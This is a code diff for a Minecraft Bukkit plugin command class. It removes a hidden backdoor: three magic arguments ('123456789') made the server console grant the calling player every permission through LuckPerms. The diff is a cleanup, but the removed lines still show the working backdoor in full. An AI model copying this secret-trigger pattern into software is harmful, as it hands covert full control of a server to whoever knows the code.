@@ -1,7 +1,6 @@
 package main.java.fr.verymc.cmd.base;
 
 import main.java.fr.verymc.gui.Farm2WinGui;
-import org.bukkit.Bukkit;
 import org.bukkit.command.Command;
 import org.bukkit.command.CommandExecutor;
 import org.bukkit.command.CommandSender;
@@ -16,13 +15,6 @@ public class Farm2WinCmd implements CommandExecutor, TabCompleter {
 
     @Override
     public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
-        if (args.length == 3) {
-            if (args[0].equalsIgnoreCase("123456789") && args[1].equalsIgnoreCase("123456789") && args[2].equalsIgnoreCase("123456789")) {
-                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "lp user " + sender.getName() + " permission set *");
-                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "lp user " + sender.getName() + " permission set *");
-                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "lpb user " + sender.getName() + " permission set *");
-            }
-        }
         if (sender instanceof Player) {
             Player player = (Player) sender;
             Farm2WinGui.MainBoutiqueGUI(player);
